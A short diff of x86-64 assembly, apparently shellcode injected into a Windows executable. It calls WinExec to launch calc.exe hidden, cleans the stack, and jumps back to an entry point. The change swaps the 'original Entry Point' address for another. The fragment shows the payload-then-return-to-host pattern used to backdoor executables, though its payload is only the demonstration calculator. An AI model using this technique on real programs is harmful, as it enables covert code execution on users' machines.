@@ -103,6 +103,7 @@ call r14                    ; Call WinExec("calc.exe", SW_HIDE)
 
 
 add rsp, 0x38 ; 스택 정리
-mov rax, 0x140023f40 ; original Entry Point
+;mov rax, 0x140023f40 ; original Entry Point
+mov rax, 0x140001338
 push rax
 ret
